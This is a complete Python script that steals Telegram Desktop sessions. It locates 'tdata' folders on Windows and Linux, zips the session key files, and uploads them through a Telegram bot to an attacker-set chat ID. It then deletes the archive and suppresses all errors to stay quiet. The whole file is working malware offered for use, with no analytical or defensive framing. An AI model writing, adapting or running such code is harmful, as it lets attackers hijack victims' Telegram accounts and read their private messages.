
import os
import zipfile
from telebot import TeleBot
import platform
from pathlib import Path



API_TOKEN = "" #BotToken
YOUR_CHAT_ID = ""  #TelegramID
bot = TeleBot(API_TOKEN)


def find_tdata_locations():
    paths_to_check = []
    home = Path.home()

    if platform.system() == "Windows":
        paths_to_check.extend([
            home / "AppData" / "Roaming" / "Telegram Desktop" / "tdata",
            home / "Downloads" / "Telegram" / "tdata",
            home / "Desktop" / "Telegram" / "tdata",
            Path("C:/Telegram/tdata")
        ])
    elif platform.system() == "Linux":
        paths_to_check.extend([
            home / ".local" / "share" / "TelegramDesktop" / "tdata",
            home / "snap" / "telegram-desktop" / "current" / ".local" / "share" / "TelegramDesktop" / "tdata",
            home / ".var" / "app" / "org.telegram.desktop" / "data" / "TelegramDesktop" / "tdata"
        ])

    return [str(p) for p in paths_to_check if p.exists()]


def create_efficient_zip(source_path, zip_name):
    essential_files = {'key_datas', 'key_data0', 'key_data1', 'settingss'}

    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(source_path):
            dirs[:] = [d for d in dirs if d not in ['user_data', 'emoji', 'dumps', 'webview', 'temp']]

            for file in files:
                full_path = os.path.join(root, file)
                try:
                    relative_path = os.path.relpath(full_path, source_path)
                    if file in essential_files or relative_path.startswith('D8'):
                        zipf.write(full_path, relative_path)
                except (PermissionError, OSError):
                    continue
    return zip_name


def execute_auto_send():
    found_paths = find_tdata_locations()

    if not found_paths:

        return

    for path in found_paths:
        try:
            zip_name = f"tdata_{platform.node()}.zip"
            create_efficient_zip(path, zip_name)

            if os.path.exists(zip_name) and os.path.getsize(zip_name) > 0:
                with open(zip_name, 'rb') as doc:
                    bot.send_document(
                        YOUR_CHAT_ID,
                        doc,
                        caption=f" \n ??????: '{platform.node()}'\n ??????: '{path}'",
                        parse_mode="Markdown"
                    )
                os.remove(zip_name)
        except Exception as e:
            pass


if __name__ == "__main__":
    try:
        execute_auto_send()
    except KeyboardInterrupt:
        print("Good bye")

